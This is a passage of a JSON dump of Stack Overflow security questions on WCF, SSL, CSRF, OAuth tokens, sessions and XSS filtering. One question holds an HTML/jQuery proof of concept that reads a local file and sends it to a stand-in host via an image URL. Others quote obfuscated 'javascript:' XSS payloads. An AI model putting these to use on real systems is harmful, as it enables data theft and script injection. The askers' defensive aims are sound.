&lt;security mode=\"Message\"&gt;\n            &lt;message clientCredentialType=\"UserName\"/&gt;\n          &lt;/security&gt;\n        &lt;/binding&gt;\n      &lt;/wsHttpBinding&gt;\n    &lt;/bindings&gt;\n\n\n\n&lt;services&gt;\n\n\n  &lt;service name=\"MessagingServices\" behaviorConfiguration=\"SecureServiceBehavior\" &gt;\n    &lt;endpoint address=\"\" binding=\"wsHttpBinding\" contract=\"IMessagingServices\" bindingConfiguration=\"wsBinding1\" /&gt;\n    &lt;!--&lt;endpoint address=\"mex\" binding=\"mexHttpBinding\" contract=\"IMetaDataExchange\"/&gt;--&gt;\n  &lt;/service&gt;\n\n&lt;/services&gt;\n\n\n&lt;behaviors&gt;\n\n  &lt;endpointBehaviors&gt;\n    &lt;behavior name=\"httpBehavior\"&gt;\n      &lt;webHttp/&gt;\n    &lt;/behavior&gt;\n  &lt;/endpointBehaviors&gt;\n\n  &lt;serviceBehaviors&gt;\n\n    &lt;behavior name=\"SecureServiceBehavior\"&gt;\n      &lt;serviceMetadata httpGetEnabled=\"true\" /&gt;\n      &lt;serviceDebug includeExceptionDetailInFaults=\"true\" /&gt;\n      &lt;serviceCredentials&gt;\n        &lt;serviceCertificate findValue=\"KServic.local\" storeLocation=\"LocalMachine\" storeName=\"My\" x509FindType=\"FindBySubjectName\" /&gt;\n        &lt;userNameAuthentication userNamePasswordValidationMode=\"Custom\" customUserNamePasswordValidatorType=\"AuthenticationHandler, mynamespace\" /&gt;\n      &lt;/serviceCredentials&gt;\n    &lt;/behavior&gt;\n    &lt;behavior name=\"\"&gt;\n      &lt;serviceMetadata httpGetEnabled=\"true\" /&gt;\n      &lt;serviceDebug includeExceptionDetailInFaults=\"false\" /&gt;\n    &lt;/behavior&gt;\n  &lt;/serviceBehaviors&gt;\n&lt;/behaviors&gt;\n</code></pre>\n\n<p>everything seems to be fine , i can add service in add service reference in VS 2010 and the proxy is created successively but in client when try to call a service operation i get a error this is the client code</p>\n\n<pre><code>ServiceReference1.MessagingServicesClient mscClient = new MessagingServicesClient();\n\n           // mscClient.Open();\n\n            mscClient.ClientCredentials.UserName.UserName = \"test\";\n            mscClient.ClientCredentials.UserName.Password = \"test\";\n            mscClient.ClientCredentials.ClientCertificate.SetCertificate(StoreLocation.LocalMachine, StoreName.My, X509FindType.FindByIssuerName, \"KService.local\");\n\n             // error is here\n            var msg = mscClient.SendMessage(\"rnd.test\", \"rnd.test\", \"Hello brother!\");\n\n            mscClient.Close();\n</code></pre>\n\n<p>and this is error </p>\n\n<p><em><strong>The identity check failed for the outgoing message. The expected identity is 'identity(http://schemas.xmlsoap.org/ws/2005/05/identity/right/possessproperty: <a href=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/thumbprint\" rel=\"nofollow\">http://schemas.xmlsoap.org/ws/2005/05/identity/claims/thumbprint</a>)' for the 'http://192.168.100.24:16027/MessagingServices.svc' target endpoint.</em></strong></p>\n\n<p>what's wrong here ? and how can i fix this problem ?</p>\n"},{"tags":["security","google-app-engine","ssl"],"answer_count":2,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":1436,"score":6,"question_id":4370309,"title":"Is ssl for google app engine free?","body":"<p>Do I have buy an SSL certificate to use <a href=\"https://myapp.appspot.com\" rel=\"nofollow\">https://myapp.appspot.com</a>, or is it free of charge ?</p>\n"},{"tags":["security","url-rewriting","csrf"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1077,"score":2,"question_id":1213246,"title":"How to prevent a Cross-Site Request Forgery (XSRF/CSRF) attack using URL rewriting?","body":"<p>A CSRF/XSRF can be prevented using a number of techniques. </p>\n\n<p>One of the technique is to use a token unique to the client session with every request being sent by the client to the server; which is being validated on the server side. If the request token and the token on the server side matches, the request is allowed to enter the application and if it does not it is not allowed to enter. Thus a CSRF attack would be detected. </p>\n\n<p>Though the idea behind the technique is very clear to me, I am not sure about how URL rewriting could help prevent a CSRF attack? Can security gurus throw some light on this?</p>\n"},{"tags":["php","ajax","security","encryption","cryptography"],"answer_count":11,"favorite_count":8,"up_vote_count":23,"down_vote_count":3,"view_count":4208,"score":20,"question_id":2336678,"title":"Login without HTTPS, how to secure?","body":"<p>For a webapplication, when HTTPS is not available as a security measure, is it possible to still make the login somewhat secure? E.g.:</p>\n\n<ul>\n<li>Tokenize logins, to make repeat attacks difficult?</li>\n<li>Somehow encrypt the sent password from a HTML password field?</li>\n</ul>\n\n<p>In particular I'm using CakePHP and an AJAX POST call to trigger authentication (includes provided username and password).</p>\n\n<p>Update on the problem:</p>\n\n<ul>\n<li>HTTPS is not available. Period. If you don't like the the situation, consider it a theoretical question.</li>\n<li>There are no explicit requirements, you have whatever HTTP, PHP and a browser (cookies, JavaScript etc.) offers in real life (no magic RSA binaries, PGP plugins).</li>\n<li>Question is, what is the best, you can make out of <em>this</em> situation, that is better than sending the passwords plaintext. Knowing the drawbacks of each such solutions is a plus.</li>\n<li>Amy improvement better than plain passwords is welcome. We do not aim for a 100% l33tG0Dhx0r-proff solution. Difficult to crack is better than complicated to hack which is better than a trivial sniffing revealing the password.</li>\n</ul>\n"},{"tags":["java","security","ssl"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":116,"score":1,"question_id":12339616,"title":"Java SSL Certificate","body":"<p>I need to communicate between two desktop Java app, and the best way to do this is to use SSL (to prevent sniffers). I control both the client and server so self-signed is okay.</p>\n\n<p>My question is if a certificate can be made and used from scratch programmatically (i.e. the end user does not have to physically do anything himself).</p>\n\n<p>If this is possible, could you give me some pointers?</p>\n"},{"tags":["security","encryption","aes","blowfish"],"answer_count":7,"favorite_count":3,"up_vote_count":27,"down_vote_count":0,"view_count":16219,"score":27,"question_id":4147451,"title":"AES vs Blowfish for file encryption","body":"<p>I want to encrypt a binary file. My goal is that to prevent anyone to read the file who doesn't have the password.</p>\n\n<p>Wich is the better solution, AES or Blowfish with the same key length? We can assume that the attacker has great resources(softwares, knowledge, money) for cracking the file.</p>\n"},{"tags":["security","oauth","access-token"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12340458,"title":"Designing (OAuth2) access token","body":"<p>We are planning to implement OAuth2 spec and are reviewing the \"access token\" implementation.\nLooks like the specification gives a lot of freedom to implementors and we are looking \nfor some best practices:</p>\n\n<ol>\n<li>What to put in the access token? We want to strike the good balance between size and usefulness.\nI realize this is very application specific but perhaps there are some things that are really worth having.</li>\n</ol>\n\n<p>So far we identified the following fields:</p>\n\n<ul>\n<li>User Identifier</li>\n<li>Expiration date</li>\n<li>Version (so that we can change the format in future)</li>\n<li>Client Identifier (i.e. app who requested the token)</li>\n</ul>\n\n<p>Some additional attributes (e.g. password hash) would be stored in the database and looked-up during\nauthentication (using the fields in the token as a 'key').</p>\n\n<ol>\n<li>How to secure it?</li>\n</ol>\n\n<p>We are leaning towards securely signing the access token (HMAC) so that we know if it was tampered with.\nThe fields in the token would be then readable by everyone.</p>\n\n<p>The alternative is to encrypt (AES) the whole thing and make it completely opaque to the user. This makes\nit much bigger (in terms of bytes). It looks like FB is now using encrypted tokens (http://developers.facebook.com/blog/post/572/)</p>\n\n<p>Any suggestions as to industry best practices?</p>\n\n<p>Thanks,\nPiotr</p>\n"},{"tags":["security","onlinebanking"],"answer_count":3,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":981,"score":3,"question_id":4159698,"title":"How do netbank login dongles work?","body":"<p><em>This is a question purely to satisfy my own curiosity.</em></p>\n\n<p>Here in Norway it's common for netbanks to use a calculator-like (physical) dongle that all account holders have. You type your personal pin in the dongle and it generates an eight-digit code you can use to login online. The device itself is not connected to the net.</p>\n\n<p>Anyone knows how this system works?</p>\n\n<p>My best guess is that each dongle has a pregenerated sequence of numbers stored. So the login process will fail if you type an already used number or a number that is too far into the future. It probably also relies on an internal clock to generate the numbers. So far none of my programmer peers have been able to answer this question.</p>\n\n<p>[Edit]</p>\n\n<p>In particular I'm curious about how it's done here in Norway.</p>\n"},{"tags":["php","security","file-upload"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12338965,"title":"Is allowing uploads of .php files dangerous if only the tmp files content is being used?","body":"<p>I'm not moving the tmp file to a 'live' (web-accessible) directory at all, simply doing a <code>file_get_contents</code> on the tmp file and running a few regexes against it (the code is <em>never</em> executed/run).</p>\n\n<p>Could this be dangerous or pose any risks?</p>\n"},{"tags":[".net","security","authentication","custom-attributes"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":3,"view_count":49,"score":-1,"question_id":12263799,"title":".NET Security attribute. Is it possible to make a custom security model?","body":"<p>Common problem: How to implement user access rights differentiation system in any .NET application (for example, WCF application) by using class/method attributes?</p>\n\n<p>So, we have:</p>\n\n<ol>\n<li>A set of users</li>\n<li>A set of roles (for example, enum <code>Role</code>)</li>\n<li>Every user have his own set of his roles.</li>\n<li><p>Every class/method could be specified for particular role. </p>\n\n<p>[AuthorizationAttribute(Roles = new Role[] { Role.Admin })]\n public class UserService : IUserService\n {</p>\n\n<p>}</p></li>\n<li><p>If user's set of roles doesn't contain this role, user mustn't have access to the method.</p></li>\n</ol>\n\n<p>Update. I've tried to make the problem description more clear. The Akton's solution is good for this problem.</p>\n"},{"tags":["security","login","web"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12338555,"title":"Password hashing when registering a user","body":"<p>I know there are similar questions but I couldn't find something that answered my question.</p>\n\n<p>When a new user registers (client - server) is there a common way of protecting these details when they are sent?</p>\n\n<p>At the moment I am just concatenating the username-password-timestamp then sending as Base64 to the server over https. </p>\n"},{"tags":["html","security","syntax","escaping","control-characters"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":44,"score":-5,"question_id":12336892,"title":"Are *all* of the \"special-\"/\"control-\" characters used by HTML represented by the class [<!=\"'/>&]?","body":"<p>Here's the class again: <code>[&lt;!=\"'/&gt;&amp;]</code>.</p>\n\n<p>As noted below, I'm not asking for any specific purpose.  I just want to know in order to further my understanding of HTML.</p>\n"},{"tags":["javascript","security","backbone.js","requirejs"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":117,"score":0,"question_id":12330509,"title":"Requirejs, Backbone and security","body":"<p>I'm actually developing a Single Page App for my company that involves different views for different user roles, to prevent people with not enough privileges to access data they are not supposed to see or to execute functions they don't have the rights to do.</p>\n\n<p>I'm using PHP with a REST api on the backend so I think I'm fairly safe there but I don't know nothing about client-side security. </p>\n\n<p>I was thinking about storing an App variable with the current user role like this way in my main.js: </p>\n\n<pre><code>require(['jquery',\n    'underscore',\n    'backbone',\n    'marionette',\n    'app',\n    'routers/adminRouter',\n    'routers/userRouter',\n    ], function($, _, Backbone, Marionette, App, AdminRouter, UserRouter){\n\nApp.vent.on(\"routing:started\", function(){\n    Backbone.history.start();\n});\n\nApp.addInitializer(function(){\n    if(userRole===\"admin\"){\n        App.Router = new AdminRouter;\n    } else {\n        App.Router = new UserRouter;\n    }\n    App.vent.trigger(\"routing:started\");\n});\n\nApp.addRegions({\n   content: \"#main\",\n   page: \"#page\",\n   dialogs: \"#dialogs\"\n});\n\nApp.start();\n\nApp.vars = {};\n\nApp.vars.userRole = userRole;\n</code></pre>\n\n<p>Where App.js is just:</p>\n\n<pre><code>define([\n   'underscore',\n   'backbone',\n   'marionette'\n   ], function(_, Backbone){\n\n       var App = new Backbone.Marionette.Application();\n       return App;\n});\n</code></pre>\n\n<p>Variable <code>userRole</code> is just a global variable that I bootstrap from my server on index.php page. How much is this safe? There is a way to change <code>userRole</code> value on page load? Or to change <code>App.vars.userRole</code> while the App is going? I can't access <code>App</code> variable from console but as I said I'm very new to the client-side programming and I must know if I can rely on that variable's value. What's the best way to approach a situation like this? Thank you in advance.</p>\n"},{"tags":["iphone","security","networking","wireshark"],"answer_count":9,"favorite_count":17,"up_vote_count":18,"down_vote_count":0,"view_count":32966,"score":18,"question_id":437061,"title":"How do you monitor network traffic on the iPhone?","body":"<p>We are looking for a Wireshark-like tool to use on the iPhone to test a 3rd party application before partnering with the 3rd party.  Any suggestions?</p>\n"},{"tags":["java","security","jsp","session","invalidate"],"answer_count":2,"favorite_count":5,"up_vote_count":2,"down_vote_count":0,"view_count":7123,"score":2,"question_id":3902688,"title":"How to properly invalidate JSP session?","body":"<p>So here is the problem. When a user logs out of my website, they can still hit the back button and continue using the site. To keep track of whether the user is logged in or not, I created a session attribute \"isActive\". The attribute is set to true when the user logs in, and is (redundantly) removed right before the session is invalidated at logout. Also on every page I check if the attribute is present.</p>\n\n<p>I also specify that pages should not be cached in their head tags.</p>\n\n<p>Despite this users are still able to hit back on the browser, and continue to use the site as if they never logged off.</p>\n\n<p>Any idea on how to fix this?</p>\n\n<p>Here is the code:</p>\n\n<p><strong>Login Servlet:</strong></p>\n\n<pre><code>...\nsession.setAttribute(\"isActive\", true);\n//Redirect to home page.\n</code></pre>\n\n<p><strong>Check Logged In JSP:</strong></p>\n\n<pre><code>&lt;c:if test='${empty sessionScope.isActive || sessionScope.isActive != true}'&gt;\n     &lt;c:redirect url=\"/index.jsp?message=Session Timed Out.\"/&gt;\n&lt;/c:if&gt;\n</code></pre>\n\n<p><strong>Logout Servlet:</strong></p>\n\n<pre><code>request.getSession().removeAttribute(\"isActive\");\nrequest.getSession().invalidate();\nresponse.sendRedirect(\"index.jsp\");\n</code></pre>\n\n<p><strong>Inside Head Tag:</strong></p>\n\n<pre><code>&lt;meta http-equiv=\"Pragma\" content=\"no-cache\"&gt;\n&lt;meta http-equiv=\"Cache-Control\" content=\"no-cache\"&gt;\n&lt;meta http-equiv=\"Expires\" content=\"Sat, 01 Dec 2001 00:00:00 GMT\"&gt;\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["php","android","algorithm","security","api"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":51,"score":0,"question_id":12336340,"title":"Securing PHP API Based on Device","body":"<p>I am creating a PHP API for an Android application and want to make it so the API only proceses requests from Android devices. Is there some sort of logic I could use to make this happen? </p>\n"},{"tags":["php","security","mongodb","authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12326501,"title":"Is it MongoDB suitable for authentication and sensitive oprations?","body":"<p>I want to create a web based chat system with authentication.<br>\nIt may hold sensitive data like emails, passwords and etc...  </p>\n\n<p>The records on my database maybe become grater and grater at each second.<br>\nIs MongoDB suitable for this plan and why ?<br>\nThank in Advance</p>\n"},{"tags":["security","sql-server-2000","sql-server-agent"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":616,"score":-1,"question_id":374748,"title":"What SQL 2000 rights are required for creating SQL Agent jobs?","body":"<p>It's been a long while since I looked at SQL Jobs on SQL Server 2000. </p>\n\n<p>On SQL 2005, if I want to allow a user to create jobs etc I add the requisite login to msdb and assign one of the roles SQLAgentUserRole, SQLAgentReaderRole or SQLAgentOperatorsRole role. No problem there.</p>\n\n<p>Perhaps someone can help me jog my memory about rights/roles required to create jobs on SQL 2000 because I'm embarassed to say that I've completely forgotten and SQL 2000 books online aren't terribly clear.</p>\n\n<p>If a user is dbo in a SQL 2000 database, does that automatically grant rights to create sql agent jobs?</p>\n"},{"tags":["php","security","cookies","session-cookies"],"answer_count":7,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":2227,"score":4,"question_id":7214458,"title":"Remember me Cookie best practice?","body":"<p>I read about many old questions about this argument, and i think i thought that the best practice is to set up a cookie with <code>username</code>,<code>user_id</code> and a random token.</p>\n\n<p>Same cookie data are stored in DB at cookie creation, and when users have the cookie they are compared (cookie data, DB data).</p>\n\n<p>Sincerely I can't understand where is the security logic if this is the real best practice.</p>\n\n<p>An attacker who steals the cookie has the same cookie than the original user :| </p>\n\n<p>Forgotten some step? :P</p>\n"},{"tags":["asp.net-mvc","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":12322493,"title":"MVC Editing Entities - Security implications","body":"<p>Probably a bit of a newbie question but Im going to ask it anyway.\nIm a webforms developer however I have been given an MVC app to look after and have found what I think may be a security hole, just want to check my thinking is right before I flag this up with my employer.</p>\n\n<p>Basically we have a view for editing an object (Call it a car)\nSo the object contains Make, Model, ManufactureYear, Color, RegistrationNumber</p>\n\n<p>The view displays all of the above but only allows the Color to be edited.</p>\n\n<p>The problem is that the other properties are written out to the HTML in hidden fields which are then posted back and used to populate a car object which is pushed through to the database.</p>\n\n<p>I saw this and thought, what happens if I change these hidden fields, and sure enough, I now have a car with a manufacture date 10 years in the future...</p>\n\n<p>The original dev says that this is the way that MVC works... Im new (litterally have 2 hours MVC experience) so cant contest this at the moment.</p>\n\n<p>Any one have any thoughts? Can anyone advise how this should be done - im also told that my way of doing it (which would be to pull the car from the database and only update the field that the view can actually manipulate) is also wrong...</p>\n\n<p>Id appreciate advice!</p>\n\n<p>Cheers</p>\n"},{"tags":["javascript","html","security","xmlhttprequest","imagesource"],"answer_count":2,"favorite_count":8,"up_vote_count":10,"down_vote_count":0,"view_count":140,"score":10,"question_id":12328132,"title":"steal user's data by running html file","body":"<p>Let's talk about security. It seems to me, theoretically, I can get information from file system of a user with some script, if the user opens html file with it (opens from his file system, not from network). Look at the code:</p>\n\n<p><em>info.txt:</em></p>\n\n<pre><code>my info\n</code></pre>\n\n<p><em>index.html:</em></p>\n\n<pre><code>&lt;!doctype html&gt;\n\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/&gt;\n    &lt;script src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.8.1/jquery.min.js\"&gt;&lt;/script&gt;\n    &lt;script&gt;\n      $(document).ready(function () {\n        $.get('file:///home/daz/desktop/info.txt', function (data) {\n          $('&lt;img&gt;').attr('src', 'http://domain.com?data=' + escape(data)).appendTo('body');\n        }, 'text');\n      });\n    &lt;/script&gt;\n  &lt;/head&gt;    \n  &lt;body&gt;&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>Some browers (firefox, for example) allow you to get files from <code>file://</code> through <code>XmlHttpRequest</code>, so if I guess path to the file, then I can get it's content by ajax. And then I can dinamically add <code>img</code> tag with <code>src</code> leading to my domain with parameters in query string. And browser make a request obediently <code>GET ?data=my%20info%0A domain.com</code>. And on the server side I can parse query string and get the data.</p>\n\n<p><em><strong>Am I right I can do this? Am I right I can get user's data from his computer if he opens my html file? So I can just say: \"Hey, friend, check out this file!\"</em></strong> (with 2 restrictions: user should use firefox or something else with similar configuration, and I cannot get files user cannot access because of access rights).</p>\n\n<p><em><strong>UPDATED:</em></strong></p>\n\n<p>If it is possible, then why it is possible? Why do they allow you to do such things. Why there is no confirm dialogs or something.</p>\n\n<p><em><strong>UPDATED 2:</em></strong></p>\n\n<p>It will be great if someone make a review about this issue. Thanks in advance!</p>\n"},{"tags":["java","security","passwords"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":65,"score":0,"question_id":12334237,"title":"Java authenticating a password","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12332467/java-authentication-security\">Java authentication security</a>  </p>\n</blockquote>\n\n\n\n<p>I have a central <code>admin</code> instance of an app where <code>judge</code> accounts are created. In order to use this judge account, a <code>judge</code> instance of the app from another computer needs to authenticate with the central <code>admin</code>. A <code>user</code> instance of the app will send something to the <code>admin</code>, who will push it off to one of the judges.</p>\n\n<p>The judges need to be able to login and authenticate with the admin. The <strong>main</strong> problem is that since every one will be on the same network and without SSL (I have no control over this) someone could sniff whatever the judge sends to the admin, and send that data himself and become authenticated as a judge.</p>\n"},{"tags":["android","security","download","sandbox"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12332888,"title":"Android: Application specific file download","body":"<p>I am quite new to android application development and at the moment I face a challenge to download pdf files by using my application where those pdfs' can only be accessed by my application, and nobody/no application else can access or view my pdfs.</p>\n\n<p>In iPhone every application has there own sandbox (logical) and resource belongs to those sandboxes' are inaccessible to other application..</p>\n\n<p>What approach is recommended if I intend to make those downloads application dependent and make them unreachable to other application and not even by mounting the android device to a PC.</p>\n\n<p>If, my question doesn't make any sense then please let me know and I will explain more to make my concern clear to you.</p>\n"},{"tags":["java","security","authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12332467,"title":"Java authentication security","body":"<p>I have a central <code>admin</code> instance of an app where <code>judge</code> accounts are created. In order to use this judge account, a <code>judge</code> instance of the app from another computer needs to authenticate with the central <code>admin</code>. A <code>user</code> instance of the app will send something to the <code>admin</code>, who will push it off to one of the judges.</p>\n\n<p>My problem is how I can authenticate a judge. If I simply send the password, it can be sniffed (since all of these instances are required to be on the same network).</p>\n\n<p>I'm not sure if using SSL would help, but even if it does, I can't use it (I have no control over this).</p>\n"},{"tags":["security","symfony2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12329855,"title":"Symfony 2 keep _target_path even on wrong password","body":"<p>When authenticating using Symfony 2.10, if I post a request to login check as configured in sercurity.yml:</p>\n\n<pre><code>form_login:\n    login_path: /account/login\n    check_path: /account/login_check\n</code></pre>\n\n<p>The _target_path is correctly set on the form.</p>\n\n<p>But if the user now types in the wrong password, the _target_path is lost and when the user now types in the right password, it will get redirected to the default place, in my case the front page.</p>\n\n<p>I would like the security handler to keep the _target_path all the way, even if the user types  the wrong password.</p>\n\n<p>Any help is appreciated :)</p>\n"},{"tags":["javascript","regex","security","unicode","xss"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":89,"score":3,"question_id":12331195,"title":"How can I programmatically get all of a string's unicode entities to resolve themselves?","body":"<p>I'm trying to mitigate XSS.  How can I shield from this:</p>\n\n<pre><code>j&amp;#X41vascript:alert('test2')\n</code></pre>\n\n<p>in the <code>href</code> of a link?</p>\n\n<p>I've tried the following, but it just assigns the literal, unresolved value of that above string as a relative path of the href, not a proper <code>javascript:</code> href capable of triggering code execution.  I'm wondering how an attacker might be able to exploit this.</p>\n\n<p>I've tried the following:</p>\n\n<pre><code>a = document.createElement('a');\n</code></pre>\n\n<p>and then both this:</p>\n\n<pre><code>a.href = 'j&amp;#X41vascript:alert('test2')';\n</code></pre>\n\n<p>and this:</p>\n\n<pre><code>a.setAttribute('href', \"j&amp;#X41vascript:alert('test2')\");\n</code></pre>\n\n<p>But both return <code>\"j&amp;#X41vascript:alert('test2')\"</code> upon then querying <code>a.href</code>, not the desired (or undesired, depending on your perspective) <code>javascript:alert('test2');</code></p>\n\n<p>If I can get all the entities to resolve, then I can parse out all occurrences of <code>javascript:</code> in the resulting string, and be safe -- right?</p>\n\n<p>The other thing I was thinking was that what if someone does <code>j&amp;#&amp;#X58;1;vascript:steal_cookie();</code>.  I mean, theoretically, they could have infinite levels of recursion, and it would all ultimately resolve, right?</p>\n\n<hr>\n\n<h1>Edit: how does this code look?</h1>\n\n<pre><code>function resolve_entities(str) {\n  var s = document.createElement('span')\n    , nestTally = str.match(/&amp;/) ? 0 : 1\n    , limit = 5\n    , limitReached = false;\n\n  s.innerHTML = str;\n  while (s.textContent.match(/&amp;/)) {\n    s.innerHTML = s.textContent;\n    if(nestTally++ &gt;= limit) {\n      limitReached = true;\n      break;\n    }\n  }\n\n  return s.textContent;\n}\n</code></pre>\n"},{"tags":["javascript","html","security","unicode","xss"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12331595,"title":"Is there a less idiotic and/or actually effective way to do this? (recursively resolving HTML unicode entities)","body":"<p>I'm parsing an untrusted URI, but its URI-hood must be honored. I'm trying to protect against <code>javascript:</code> links, but I feel like I need to recurse on it, since you could have:</p>\n\n<p><code>javascriptjavascript::</code></p>\n\n<p>and after stripping out all instances of <code>javascript:</code> get back our old friend <code>javascript:</code> once again.</p>\n\n<p>My other concern is analogously-nested unicode entities.  For instance, we could have: </p>\n\n<pre><code>\"j&amp;#X41vascript:alert('pwnt')\"\n</code></pre>\n\n<p>...but we could also have:</p>\n\n<pre><code>\"j&amp;#&amp;#X5841vascript:alert('pwnt')\"\n</code></pre>\n\n<p>...though I seem to be doing it wrong (whereas a successful attacker obviously won't.)</p>\n\n<pre><code>function resolveEntities(uri) {\n  var s = document.createElement('span')\n    , nestTally = uri.match(/&amp;/) ? 0 : 1\n    , limitReached = false;\n\n  s.innerHTML = uri;\n  while (s.textContent.match(/&amp;/)) {\n    s.innerHTML = s.textContent;\n    if(nestTally++ &gt;= 5) {\n      limitReached = true;\n      break;\n    }\n  }\n\n  return encodeURI(s.textContent);\n}\n</code></pre>\n"},{"tags":["security","jsf-2"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":350,"score":1,"question_id":6890467,"title":"Securing JSF applications","body":"<p>I've been asked by a freelancer friend of mine to join him on a JSF 2.0 project, and I'm slowly picking up speed and putting the pieces together. Coming from a Windows Forms .NET world, I have a lot to learn to say the least.</p>\n\n<p>My major concern is with the lack of apparent consensus on how to protect a JSF application.</p>\n\n<p>Some methods have been proposed here on SO, including using Spring security, Seam security, custom phase listeners, or simply using the rendered=\"#{...}\" attribute to show/hide components based on user authentication.</p>\n\n<p>I have tried to implement some of these methods, for example Spring security, only to find out that it gets easily defeated by the JSF navigation mechanism that forwards to views instead of redirecting. In other words, Spring security will work fine if the user types in the url of a secured page directly, but not if a commandButton's action takes him there.</p>\n\n<p>In view of this, some have suggested to force a redirect by using \"faces-redirect=true\", but we feel that this could become a performance issue as this causes 2 requests from the browser each time.</p>\n\n<p>On the other hand, I gave up trying to implement Seam security after getting so many missing dependencies errors.</p>\n\n<p>The best solution I have found so far is a custom phase listener from Duncan Mills (http://duncanmills.sys-con.com/node/250254), but I'm not 100% convinced this should be used on public facing JSF applications.</p>\n\n<p>So finally, what does this leave us with ? I know this is a pretty wide open ended question, but I honestly have no clue where to go next. I'm pretty sure I have followed the different tutorials to the letter, for example Spring tutorials, but I'm still not satisfied with the way it works.</p>\n\n<p>Could anyone at least confirm/infirm the fact that Spring security is supposed to work across JSF forwards, as I've seen many posts by others having the same issue ? That would at least give me a direction to keep going.</p>\n\n<p>Thank you.</p>\n"},{"tags":["php","javascript","security","ssl","privacy"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":71,"score":3,"question_id":12330955,"title":"Recusing myself from my own secure system","body":"<p>This is more of a software engineering question than a programming one. I tried to make the title as relevant as possible, if someone feels they can word it more appropriately please let me know.</p>\n\n<p>So, I have been developing an instant chat web service using asynch. javascript and PHP. The main selling point behind the application is utmost secrecy. There are many instant chat apps out there, from Live Messenger, Yahoo Messenger, IRC and Skype, to name a few. However - call me paranoid - but I felt like I could never trust the companies behind the software as very little control is exposed to the user and most seem to neglect privacy issues altogether. I'm aware there are many other secure/private IM apps, but decided to create my own, it uses SSL to encrypt communication between all points of use (user->database->user), the to/from properties within the message table are SHA256 hashed with a salt and as a further precaution messages are automatically deleted from the database as soon as the recipient receives (or requests I should say) the message.</p>\n\n<p>At the moment the messages themselves are left plain text. I could use PHP's various encryption libraries but how would I do so in a way that would remove the potential for myself, the owner, to decrypt messages thus compromising privacy?</p>\n\n<p>I would by no means do this of course, I would just like to prove privacy to this extent. If I were to encrypt with a password, I would know the password. If I were to encrypt with a programmatic password, I would know where PHP would store the password.</p>\n\n<p>Is there a way to solve this? Or does this just end with trust?</p>\n\n<p><strong>UPDATE:</strong> As far as I'm aware PHP is stateless, but sessions for example force the server to store data in memory, could this be a solution to have the key/password stored in the memory?</p>\n\n<p>Thanks for any ideas or advice.</p>\n"},{"tags":["java","security","rsa","x509certificate","jce"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":135,"score":2,"question_id":12330975,"title":"Generate certificate chain in java","body":"<p>The question is how to generate certificate chains programmatically in Java. In other words, I would like to perform in java the operations detailed here: <a href=\"http://fusesource.com/docs/broker/5.3/security/i382664.html\" rel=\"nofollow\">http://fusesource.com/docs/broker/5.3/security/i382664.html</a></p>\n\n<p>Besically, I can create the RSA keys for a new client:</p>\n\n<pre><code>private KeyPair genRSAKeyPair(){\n    // Get RSA key factory:\n    KeyPairGenerator kpg = null;\n    try {\n        kpg = KeyPairGenerator.getInstance(\"RSA\");\n    } catch (NoSuchAlgorithmException e) {\n        log.error(e.getMessage());\n        e.printStackTrace();\n        return null;\n    }\n    // Generate RSA public/private key pair:\n    kpg.initialize(RSA_KEY_LEN);\n    KeyPair kp = kpg.genKeyPair();\n    return kp;\n</code></pre>\n\n<p>}</p>\n\n<p>and I generate the corresponding certificate:</p>\n\n<pre><code>private X509Certificate generateCertificate(String dn, KeyPair pair, int days, String algorithm)\n  throws GeneralSecurityException, IOException  {\n    PrivateKey privkey = pair.getPrivate();\n    X509CertInfo info = new X509CertInfo();\n    Date from = new Date();\n    Date to = new Date(from.getTime() + days * 86400000l);\n    CertificateValidity interval = new CertificateValidity(from, to);\n    BigInteger sn = new BigInteger(64, new SecureRandom());\n    X500Name owner = new X500Name(dn);\n\n    info.set(X509CertInfo.VALIDITY, interval);\n    info.set(X509CertInfo.SERIAL_NUMBER, new CertificateSerialNumber(sn));\n    info.set(X509CertInfo.SUBJECT, new CertificateSubjectName(owner));\n    info.set(X509CertInfo.ISSUER, new CertificateIssuerName(owner));\n    info.set(X509CertInfo.KEY, new 